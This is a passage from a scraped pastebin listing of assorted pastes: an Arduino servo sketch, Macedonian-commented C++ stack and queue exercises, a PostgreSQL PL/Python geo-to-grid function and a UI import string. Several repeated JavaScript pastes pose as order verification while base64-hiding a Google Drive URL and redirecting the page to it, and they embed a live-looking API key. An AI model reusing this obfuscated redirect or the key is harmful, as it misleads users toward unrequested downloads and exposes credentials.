  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nHQuJXnU,**Servo Control** rev_01,pleasedontcode,Arduino,Monday 24th of March 2025 04:42:02 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Servo Control**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-03-24 09:40:52

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* make it work */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include <Servo.h>	//https://github.com/arduino-libraries/Servo

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t button_PushButton_PIN_D2 = 2; // Define button pin

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo servo1; // Create servo objects
Servo servo2;
Servo servo3;
Servo servo4;
Servo servo5;
Servo servo6;
Servo servo7;

void setup(void)
{
	// put your setup code here, to run once:
	pinMode(button_PushButton_PIN_D2, INPUT_PULLUP);
	
	// Initialize servos
	servo1.attach(11);
	servo2.attach(10);
	servo3.attach(3);
	servo4.attach(4);
	servo5.attach(5);
	servo6.attach(6);
	servo7.attach(7);
	
	// Set initial positions for servos
	servo1.write(180);
	servo2.write(180);
	servo3.write(180);
	servo4.write(180);
	servo5.write(180);
	servo6.write(180);
	servo7.write(180);
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	int button = digitalRead(button_PushButton_PIN_D2); // Use the defined button pin
	static int buttoncount = 0; // Use static to retain value between calls

	if (button == HIGH) {
		buttoncount += 1; // Increment button count

		if (buttoncount == 1) {
			servo1.write(180);
			servo2.write(180);
			servo3.write(180);
			servo5.write(180);
			servo6.write(180);
		}
		if (buttoncount == 2) {
			servo4.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo3.write(90);
			servo2.write(90);
			servo6.write(180);
		}
		if (buttoncount == 3) {
			servo3.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
		}
		if (buttoncount == 4) {
			servo6.write(90);
			servo5.write(90);
			servo7.write(90);
			servo4.write(90);
			servo1.write(180);
			servo2.write(180);
		}
		if (buttoncount == 5) {
			servo1.write(90);
			servo6.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
			servo7.write(180);
		}
		if (buttoncount == 6) {
			servo3.write(90);
		}
		if (buttoncount == 7) {
			servo7.write(90);
			servo6.write(180);
			servo5.write(180);
			servo2.write(180);
			servo3.write(180);
		}
		if (buttoncount == 8) {
			servo2.write(90);
			servo3.write(90);
			servo5.write(90);
			servo6.write(90);
		}
		if (buttoncount == 9) {
			servo3.write(180);
		}
		if (buttoncount == 10) {
			servo3.write(90);
			servo5.write(180); // Fixed typo from 'ervo5' to 'servo5'
		}
	}
}

/* END CODE */"
uuQaApiR,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:34:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/666/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uYkAKK6q,geo2grid04,aghoshpro,PostgreSQL,Monday 24th of March 2025 04:29:50 AM CDT,"-- FUNCTION: rasdaman_op.geo2grid_final(text, double precision, double precision, double precision, double precision)

CREATE OR REPLACE FUNCTION rasdaman_op.geo2grid_final(
	""geoPOLY"" text,
	min_lon double precision,
	max_lat double precision,
	resolution_lon double precision,
	resolution_lat double precision,
	OUT ""gridPOLY"" text)
    RETURNS text
    LANGUAGE 'plpython3u'
    COST 100
    VOLATILE PARALLEL UNSAFE
AS $BODY$
import numpy as np
import re
from affine import Affine
from shapely.geometry import Polygon, LinearRing, MultiPolygon
from shapely.ops import unary_union
from shapely import wkt

def grid2WKT_ring(y_grid, x_grid):
    coordinates = list(zip(y_grid, x_grid))
    if coordinates[0] != coordinates[-1]:
        coordinates.append(coordinates[0])
    ring_wkt = ""LINEARRING("" + "", "".join(f""{x} {y}"" for x, y in coordinates) + "")""
    return ring_wkt

def grid2WKT_polygon(y_grid, x_grid):
    coordinates = list(zip(y_grid, x_grid))
    if coordinates[0] != coordinates[-1]:
        coordinates.append(coordinates[0])
    polygon_wkt = ""POLYGON(("" + "", "".join(f""{x} {y}"" for x, y in coordinates) + ""))""
    return polygon_wkt

def geo2grid(lons, lats, xmin, ymax, x_scale, y_scale, xskew = 0.0, yskew = 0.0):
    aff_gdal = Affine.from_gdal(xmin, x_scale, xskew, ymax, 0.0, -y_scale)
    lons = np.array(lons)
    lats = np.array(lats)
    xs, ys = ~aff_gdal*(lons, lats)
    xs = np.int64(xs)
    ys = np.int64(ys)
    return xs, ys 

def process_boundary(boundary):
    coords = np.dstack(boundary.xy).tolist()[0]
    coordinates = [{""long"": x, ""lat"": y} for x, y in coords]
    
    lat_arr = []
    long_arr = []
    for coord in coordinates:
        long_arr = np.append(long_arr, coord['long'])
        lat_arr = np.append(lat_arr, coord['lat'])

    long_list = long_arr.tolist()
    lat_list = lat_arr.tolist()

    x_grid, y_grid = geo2grid(long_list, lat_list, xmin, ymax, x_scale, y_scale)
    return x_grid, y_grid

def processPOLYGON(inputPOLYGON):
    if inputPOLYGON.area == 0:
        return None
    
    ext_x_grid, ext_y_grid = process_boundary(inputPOLYGON.exterior)
    
    if len(inputPOLYGON.interiors) == 0:
        gridPOLYGON_wkt = grid2WKT_polygon(ext_y_grid, ext_x_grid)
        return gridPOLYGON_wkt
    
    else:
        ext_coordinates = list(zip(ext_x_grid, ext_y_grid))
        if ext_coordinates[0] != ext_coordinates[-1]:
            ext_x_grid = np.append(ext_x_grid, ext_x_grid[0])
            ext_y_grid = np.append(ext_y_grid, ext_y_grid[0])
            
        rings_wkt = ""POLYGON(("" + "", "".join(f""{x} {y}"" for x, y in zip(ext_x_grid, ext_y_grid)) + "")""
        
        for interior in inputPOLYGON.interiors:
            int_x_grid, int_y_grid = process_boundary(interior)
            unique_points = set(zip(int_x_grid, int_y_grid))
            
            if len(unique_points) >= 3:
                int_coordinates = list(zip(int_x_grid, int_y_grid))
            
                if int_coordinates[0] != int_coordinates[-1]:
                    int_x_grid = np.append(int_x_grid, int_x_grid[0])
                    int_y_grid = np.append(int_y_grid, int_y_grid[0])
                    
                rings_wkt += "", ("" + "", "".join(f""{x} {y}"" for x, y in zip(int_x_grid, int_y_grid)) + "")""
        
        rings_wkt += "")""
        return rings_wkt

def geoPOLYGON_to_gridPOLYGON(inputREGION, min_lon, max_lat, resolution_lon, resolution_lat):
    global xmin, ymax, x_scale, y_scale
    xmin = min_lon
    ymax = max_lat
    x_scale = resolution_lon
    y_scale = resolution_lat
    
    try:
        inputREGION = wkt.loads(inputREGION)
        
        if inputREGION.geom_type == 'Polygon':
            return processPOLYGON(inputREGION)
        
        elif inputREGION.geom_type == 'MultiPolygon':
            polygon_wkts = []
            
            for polygon in inputREGION.geoms:
                grid_polygon = processPOLYGON(polygon)
                if grid_polygon:
                    polygon_wkts.append(grid_polygon)
            
            if not polygon_wkts:
                return None
                
            try:
                grid_polygons = [wkt.loads(poly_wkt) for poly_wkt in polygon_wkts if poly_wkt]
                merged = unary_union(grid_polygons)
                return merged.wkt
            except Exception as e:
                return f""MULTIPOLYGON({','.join([p.replace('POLYGON', '') for p in polygon_wkts])})""
        
        else:
            raise ValueError(f""Unsupported geometry type: {inputREGION.geom_type}"")
    except Exception as e:
        return f""Error: {str(e)}""

gridPOLY = geoPOLYGON_to_gridPOLYGON(geoPOLY, min_lon, max_lat, resolution_lon, resolution_lat)
return gridPOLY
$BODY$;"
V4umZUdA,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:19:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/599/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H2ViN33A,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:04:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
A8YtKZ7C,Untitled,Josif_tepe,C++,Monday 24th of March 2025 03:52:44 AM CDT,"#include <iostream>
using namespace std;
const int max_size = 1000;
// implementacija na red
struct queue {
    int niza[max_size];
    int S, E;

    void init() {
        S = 0;
        E = -1;
    }

    bool isFull() {
        if(E == max_size - 1) {
            return true;
        }
        else {
            return false;
        }
    }

    bool isEmpty() {
        if(E == -1) {
            return true;
        }
        else {
            return false;
        }
    }
    
    void push(int x) {
        if(isFull() == true) {
            cout << ""redot e poln"" << endl;
            exit(-1);
        }
        E++;
        niza[E] = x;
    }
    int pop() {
        if(isEmpty()) {
            cout << ""redot e prazen"" << endl;
            exit(-1);
        }
        int res = niza[S];

        for(int i = S; i < E; i++) {
            niza[i] = niza[i + 1];
        }
        E--;
        return res;
    }

    int front() { // top(), peek()
        if(isEmpty() == true) {
            cout << ""redot e prazen"" << endl;
            exit(-1);
        }
        return niza[S];
    }

    int size() {
        return E + 1;
    }

};
 // pravime funkcija so 2 argumenti
void promeni(queue & q1, queue & q2) {
    // dodeka ima uste elementi vo q1
    while(q1.isEmpty() == false) {
        // go vadime prviot element
        int c = q1.pop();
        
        // ako ne sme na krajot
        if(q1.isEmpty() == false) {
            int c2 = q1.front();
                // pravime proverka za toa dali zbirot e pogolem ili pomal od 9
            if(c + c2 > 9) {
                q2.push(c);
            }
            else {
                q2.push(c + c2);
            }
        }
    }
}
int main() {
    int broj;
    cin >> broj;

    int prevrten = 0;
    // go prevrtuvame brojot, bidejki queue raboti na princip FIFO
    while(broj > 0) {
        int cifra = broj  % 10;
        prevrten = (prevrten * 10) + cifra;
        broj /= 10;
    }

    queue q;
    q.init();

    queue res;
    res.init();
    // gi vmetnuvame vo q
    while(prevrten > 0) {
        int cifra = prevrten % 10;
        q.push(cifra);
        prevrten /= 10;
    }

    promeni(q, res);
    // go pecatime rezultatot
    while(res.isEmpty() == false) {
        cout << res.pop();
    }
    return 0;
}
"
V6dAMM2T,Untitled,Josif_tepe,C++,Monday 24th of March 2025 03:50:34 AM CDT,"#include <iostream>
using namespace std;
const int max_size = 1000;
// implementacija na stek
struct stack {
    string niza[max_size];
    int idx;

    void init() {
        idx = -1;
    }

    bool isFull() {
        if(idx == max_size - 1) {
            return true;
        }
        else {
            return false;
        }
    }

    bool isEmpty() {
        if(idx == -1) {
            return true;
        }
        else {
            return false;
        }
    }
    void push(string x) {
        if(isFull() == true) {
            cout << ""stekot e poln"" << endl;
            exit(-1);
        }
        idx++;
        niza[idx] = x;
    }

    string pop() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        string res = niza[idx];
        idx--;
        return res;
    }
    string top() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        return niza[idx];
    }

    int size() {
        return idx + 1;
    }
};


int main() {
    cout << ""Vnesi broj na patiki: "" << endl;
    int n;
    cin >> n;

    stack s;
    s.init();
    for(int i = 0; i < n; i++) {
        cout << ""Vnesi patika: "";
        string patika;
        cin >> patika;
            
        // ako nema patiki za sparuvanje, samo ja dodavame momentalnata patika na vrvot
        if(s.isEmpty() == true) {
            s.push(patika);
        }
        else {
            // proveruvame dali momentalnata patika e razlicna so taa na vrvot za da mozhe da gi spoime
            if(s.top() != patika) {
                // ako mozhe, ja trgame od vrvot
                s.pop();
            }
            else {
                // ako ne mozhe, ja stavame na vrvot
                s.push(patika);
            }
        }
    }
    // kolku sto ima patiki vo stackot, tolku nespareni ni ostanuvaat
    cout << s.size() << endl;

    return 0;
}
"
7y2xnhD2,Untitled,x41w,JavaScript,Monday 24th of March 2025 03:48:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/906/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
49s4t5pV,Untitled,Josif_tepe,C++,Monday 24th of March 2025 03:46:52 AM CDT,"#include <iostream>
using namespace std;
const int max_size = 1000;
// implementacija na stack
struct stack {
    int niza[max_size];
    int idx;

    void init() {
        idx = -1;
    }

    bool isFull() {
        if(idx == max_size - 1) {
            return true;
        }
        else {
            return false;
        }
    }

    bool isEmpty() {
        if(idx == -1) {
            return true;
        }
        else {
            return false;
        }
    }
    void push(int x) {
        if(isFull() == true) {
            cout << ""stekot e poln"" << endl;
            exit(-1);
        }
        idx++;
        niza[idx] = x;
    }

    int pop() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        int res = niza[idx];
        idx--;
        return res;
    }
    int top() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        return niza[idx];
    }

    int size() {
        return idx + 1;
    }
};
// pravime funkcija so argument stack
void promeni(stack &s) {
        // go inicijalizirame
    stack pom1;
    pom1.init();
    

    // gi vadime elementite od stackot, i gi stavame vo pom1
    while(s.isEmpty() == false) {
        pom1.push(s.pop());
    }

    // pravime drug pomosen stack
    stack pom2;
    pom2.init();

    // gi vadime elementite od pom1
    while(pom1.isEmpty() == false) {
        
        // go gledame momentalniot element sto e na vrvot
        int momemtanel = pom1.pop();

        // ako ima elementi vo pom2
        if(pom2.isEmpty() == false) {
            int delitel = pom2.top();
            // proveruvame dali e ispolnet uslovot za delivost
            if(momemtanel % delitel == 0) {
                // go dodavame na s, bidejki s e ispraznet
                s.push(momemtanel / delitel);
            }
        }
        // go zacuvuvame kako prethodnik vo pom2
        pom2.push(momemtanel);

        // proveruvame dali ne sme na posledniot elemenet
        if(pom1.isEmpty() == false) {
            // istata proverka za delivost
            int sleden = pom1.top();
            if(momemtanel % sleden == 0) {
                s.push(momemtanel / sleden);
            }
        }
    }
// go pecatime krajniot rezultat
    while(s.isEmpty() == false) {
        cout << s.pop() << "" "";
    }

}

int main() {
    // kod daden od samata zadaca
   stack m1;

    m1.init();

    m1.push(2);
    m1.push(10);
    m1.push(5);
    m1.push(2);
    m1.push(1);

    promeni(m1);

    while (!m1.isEmpty()) {
        cout << m1.pop() << endl;
    }

    return 0;
}
"
wP8JaHYU,Current DK UI,saimpot,PHP,Monday 24th of March 2025 03:35:45 AM CDT,!WA:2!S33c8TXX5DQfWYpyEykABAjAjly5yAszjkaqaqafROcqc(qIVeaPOKCCiwaSa7kUy3v7UqKq9zuCtvABAVYCTxQVEjPm5A7DxBAoEo5UK2MhQ(UET312XmxtrsAsDyILtAsRtystDsBJUVzMDbw8GGGuGuu(XpdrGDNDMzN5))VhZ8nZWC6w0I7Tlxb6YBlzAjzljVs7kTKqwsxvwuKlzV8cIjv5KoNY91hhRoVJtkjKMx3rWSQSocXQQ0sjx2XiScsk3FPxlcNMCw1eCAknxwEmxzp(4QYj0woUSAso1qSjMjPQSIsZHefU0Lyvt6yczzrDbL4ZYMwEO(Mxl4fp9zhTBxruNBSuP040zMpTQCwLHGQVQRU95g()fzLsWlRoUSGKE8Edp6eHJO0SgpRkxY(vzZWnm3f5e5xKwK9klkREcggg7UZQkQSxEDDfTJEKJGlVUeKpsHc8i(8RYMqxqwsZxenDwv9MINsqsqJVPqWF0B6Y6QcPtZPQ1w7QgF9DUqsU4ztLAICkCQdgE4X7FYHdPd)icl0w6(YAkCIIdLuRPL1YghQvs6rHulm3It3BWOtmD0jcgzIqzHmpUIiBoo1cjBCvoizrIoE4Hhoc5kXhKJvuNpIe8cQ108zLmQcnTc0kWPkXkEAOQb1(F7514etrACqnREr6fFxla5CeU043UMcjkZMS)qAcxIR1izYcn)nfcQPjAf5SPijez10WFlUoRiuU4VUuCJ(nAJPD72h3UZU8gNcbIlKrrwvpIwc4bShN2SZVa9VHtMMtzxrVqwO3Xr)zffDmfVGo3cQK6cUDlcP)1i5rH60oVk970()7kUgxg4TiURUC3Ll)lOlNW4DA3mF479acjldz2lU(7yCOcppRKqgwChQpuR9FvownUO6aSpTo)DG2xijzjULscDt4umnUttvJdqzj1UmoP4QgkCOma2VFuFWdGcJ6hnaAq4V3F5xzXuyChK7S6S2xHcpjqrCUepAVrchEu1Cga64qHKsiDtlXMvhs3ykemxtg41HKG0ayvHKlErNPhGxksWzYDPfWvmbJekiLswL(M1(IWxtWfgJq0ITiPPKwm8ryfv4zT3sIpWLVYXMNvnXWKx9NQvKTpGpL92pNgaBeKs7iAIC68CooSJWq)4SCalAXqqBJJO8cCIjvAL28YkL0rFCjyZ5OdSCIoxyqUmYanrtqBLtkikic50iSj4fK4cfridNYEpTGAwmcYX4ISPZIlGrL1DGXECjv2tL3DebnnO(yTQnLCwOyl5bBnchl0v9OAqPPoJJoOeWoxm8CWZKrqIvNBLtZMrrqviHdOhrygoL7DiPuIceUTd5uoIkRQkpRY9b8a5KjHcAgovOqccj4ICk3tzxoeK9k7AYmXHxYez1CegZ2YQTsKSqB0eSkoyPp3dogu9tjWL0XPfGIvw0rhsaZvLuX16uzVK8fF)qIWBsz39Hl7Uh2Hci3SSe1k5vgEdijg6iiLCNkT1Rm0gkkRaDu5k7z29qjYbvtra5u2D2vyja(tqag0ILO9fXXxKtfOTZkKsN0ZpoqdsLvuP5jLeb2bpup7hEMlLJavsdpaaDvAXYpmEdwmA2Kj5KC0NSCM5PiPiY6xoc7LKHoioL9eusxa6ktJ7T4bPLfFR2RbE0bPLEkOBh6(kC37RqNmTXWOxypdbcKiOM(bzsc6zH2sJB18eYzIRPJH2MjoyCzcKbdmgwitClfEFalg32u1cN8IczLAglxByHe8ahgsU51wSpC)v0SjsiRQCOjXnlqXX1rYoX4ks12Tsc47dNnbPFfZd7tLD2hs5GLL6(vbYMrQNsqsYSBJDMhs5XQAA9qs7izXcvKbClT)QIepPeVSyUvjNPuehHGUCD42rzLa1uskTtzOzicCpYrWD0XDibCujooGJciMCzKv5u23iYPvbKdhMTssChwbGTfwtJtkbN5BoTWovwoojLMlx(08Gmo1u43mLh0Oo3RCMmSeSwPa7deHvqdAi5ylYrmBWpeT1bDNO7c1e61fxb0lbkkdHEdO34LbOBsSe7dePp0U4xaa8I9kOMqKlwenf2eC3f6Eq3l6(a1jnHU)Mq7Uj0EARDuBVt0dG2lOo4br7VjKd0dHEtOhb1rtO2rpk6aOhg1ztlMqwmBgPO4mXo6G)2Hab1ZUWGJfzOZn2OteC4lNvJdWFceP2cPLqnJgRP5XvNPesQZ)6qJakN0zX67zq3T7jgBC0HExOd3eQfILnxgYnJ8UR(rhbRYg5I8VUj)B3e95QSjfYQ9uVEKNcAWrJBh5f5d9yqb2J9fsWHnLG0cmCeKFELMTOkJ8pk7fOcZGvaOD0(ojMCaeqklnoRk6nF1K5aduesqueHo2odPbSqqp5jW1rDcrJb1lwFC56uhAT1YQSllvNXjDC8ldkgHwgj9(boTSA8ib7BOjJIgTj0B5Uqhh9JHcAyMaYEerCl8RdnLD0jxmA4Hd37e9hj4iHvP2jWXJo1IHJgwmU0qIt5ndka6OZdyqLGsPf52)k43KbZfhdryJlYDfpOz4r)S8OFcE0f4rVnE0f5r)m8Oz5rVdE0Vapkjp6S8iwEKapkdpsKhLIhPYJsZJohp6DXJoppkop6hNhXZJMJh9ZZJYYJu4r)I8iOU8K8inE0phpkhpsNhjXJ(j5rVtE0v4r)u8OFAE0BNhDjE0L5rj4rVBE0VepsMh9w5rpfpAAEu0Mqt0kAYyOxpZvCUGa0kfLyS2E3bg2J(Lr2xKn55ZcVFjhrqYgAeaxHAEPeG14jLNvcK8RWf7QM)eBfhFPa)3ia8VMkGBhf6m4xb(Y0uvXedW4Vk2ayI5Vcj1AlUhV(D5UBaMknMKyUyeQrhnHFQWZbDCrP2jhJqxksIMhNjedEX5qa3D7NWYWSToBcqdeQ9eu7Ghroj3V7oaU1YG0O0QCAA0x4dU3DydJVbl11y1XM7bVjyYZjAfTVLaRIX22IHRsjtH2384lqSdBj6FMwMynLDdBsNorb3jmCPz6lkOja4Hyg2Vnnh0wHoQ5VWgzB)AlLwuEwqa8fYcY7Yn(T5Sl3Er7tfkm8nUk(F6ZWsu7xg)lmhme2ZjYtobVqIzafoA2xe)ZZsTWZ(84FuWKC7HW)m2c4)LAQ39DvO9DaZ0WtE2Zy9zJsSyN81HbP0A7I8WHOgWFLhq5b15MtFAY)qT4CALP1bB7m(fJYEQibAgFbfE(c37apIsvsPIXxIGZXKltUvbpxcfCYjgt5EixemtwgBTBcISWqbHFUcnJeMJJkG8TR8MwTQQixA2e5Mofi8xn2vjjad7fsLdWeezsCtaxm0OJnAyLMP1cE2KMnS4EALoxTm3qA3068aGd0jLKH2RItQYdTApLIkxcbShm2xGC3ef6cN3i1s6rgLvEwELwSuHm66ymUivw4zl9I0uAEXLixBwO)CkvwLlpLXxOTcM42LknJwQqvG4u7ytoXWdnA4Rst00keFUdn2etm2iftj2RT9zKpfQLowTx)mYjNgtdJfNNdBuqauxxPz1lbwubEkBdRYhR8auz1kO9quo28yzlef88unzljqe5NGJ41gOKR94yhhe5wSVWbNyWto6qdm4eWJhp6Gbhj4OXwcNbkC6Xz11f5aTAeHvQSPLLaP5WtYtkcINVXwg)vIGRzKaXvXqUAh9dTdL6LnUrIykTui5qVqs6fxU0F3k6h(S39cfZNDF7R8cunZKIpOHSxq6lli7hRdEJQvenr7GCELDdMna2Cz4njXHWWGBoQAXIueFvEzlaQvEZHWAhYZCxXaBoavGCIZOKTJZh1FOeevLOHrFqEYRCVgAdarTrW9Fy9RHUeyyp2wIUdH5PXkQV9Sk3RP6dmbRpbnSAtqR4jShzwmPnmOBcuudD4yh654lQqIDoBelTIEW2JKGNlXm9JAZ(bKvoWB5yrUiRywUd4Y3LViRQaohbt6bj4AQj4zbVw0AR18m3tS2ZZ0I5dDSJbx5aUDMN5EZZCF5zATT2Xj5YGEcaGRNdp0iD1DxyrFx2SgZVYmCGMFCpPEeSC5yxXj63TOYt0VNPkt0hog63VA6grFKyO)R8OfBlURaU81Th0ZyQ2d9r5ltrh6JHtLxx(Dzrbh6)brFg6JBQcd9jOAUohO5c9haARq)HO)i7Opjrif6tfd9Prhf9zSFn0vn1WG(JrpRD0)ZiJdskfr)j2r)VTJ(tjib0Fgp6)Z9H()YJ(ZTJ(lSJ(l3fcbI8rphdAjat9zbz2O)FO)k0Nd9xJYJ(8OVWBh9fJH(BGkXxc9Lr)T0I85bXDOVcAz7OVknt)AOxaDng0lYG(6mOVb6Vd9nJH(wmO)E0)a6LqFB03zFOvyqF3yxzpwkhTYlh4bmlhCUd5KLC)5ZHZDJYhxc48gkfOo8sON2OeGQW3dKQ89r)R8Ox2qOb6F0wEgBXaHfOFi6FgKoG(xIH((yPmO)PyORhd9J4ZZSd4dtrkFEg7ap(dD35zUTDVZ8peL)MNzNnccBEMBh(ChK3S8m3jWdbkyrwyIb7m4zc4pNO2WfzH5zEDesxEMxpHYLN5nyHWDU8mVrm7kpZDBqTYZ0m8m7QazQiPOLhhOaT4TmkrEM7h9jSsDECm1PfFqYwMBoWBBIfktacXT(i5z2DEM9afuBLrsifD1jk7MWvkHOGPcguekJyLYg4jtoZITLN5bmOrRgBH23GB0H2El9nLDL7VIRugf7ZyNWYkLI9hzHI9NfJWWYZSVsPxyQhWVaMfWVawMj)cWPf4xF3yRc9ctiwHYTEoMk5wyiFrYfWpm4wpVjXa4xxRU5xLwcRqYWY5x8w4xugOj)cOiTJPiiN(E27o2ZC3X(q3Dmdch1puR8nGasiKe2Mfwgtmm1RaB0KUHzSgCnaaJXyyPGLqwWGoSZEVEgcQ)dsX)VrEtgsPUa(eecdLor4sNArF(8iN8CjZemyekBHYij(pzstbg5gx6pgRUgs(D3t3b80ZMIK)kWLVkqS)vAgqoffTxqbWpOuWiw5WpcJfjyVsbJ2IDtu0)uUd43dR4GsD3r9k6)TUgI(BRc7HQMS)vvqEJfVhXRlxU9Sfb3JDteU)a1cUVHkh(ILZtxOCiG(RrLfdy2N5UP4DI1oarWuEBjw3SZkfnVLJZhlrNPsiLlyyXW1lo)jx)4C3vIZvAbBXV3US6g8wdWpGtVURhG)jULg4FRkG80N60Ht4AwLqjJxVaY32AaiBAJGREBaU67tGjaWcaseNdD51FplLHvh8hwlkV8SJjTGg8NGIZYMtJovdX1zvtZPBo9da2dWJy4hfCca1hqDWGrgP)jhgaFwM4Idqhrd24AYQK4mapyQ0rcHLK)6Qz5ido7YfthjnO2xO3cZmnzesWrZqm8uEKuq78zLidrRBwPCO)h2BmqD1G9gfplZBFSRPm8(ZwoEVAUxEhiNTfRcaV9oERBLa(bsnBs1otoMyMzQxa)0RdNmnCF0drc8(lZsdC68bPdUzC80gWLeUhtPUIUrDRCuaBdwbEG8mhYIZLD0Kf)lxaJtdpNGMUguehCjncLYieek6LjMesyG5z6e9a5zomGSZZaTjEkbpVXD3mwjKG63DtVBJC3Sa(VGT2eOVbq2Gsq95RuaVvUaLDqPanCh)IvPJF6UhnP(idCX(UuNL64xfiyk4LGJxneCEMEQe9UHDGSQY)90TlNaqnpZJrf2JX21qqpfQAvgFEMUGkZriIXZZ4eyc5zCLNXDSQdPFnVoxFEDwd5)8BxL)N5sNqj8akPprMK1R8F2nb5)vL9uq2VltItbkAjKhIac4fIk0VfSbkJGTsA6eYzLalraYJNU90JpWF3dEvQuEAiHqOqlMPyABXfL2yq8OCjGRPCpws0ykCQS6YQh4TCmmpdOEuJ9bciMnIjHfPtVYCuCA8U1gBTCRTDcRYz7FiYqmwGEXFdtVarVfLsxQ7JpUf3hlh8AvEDbEf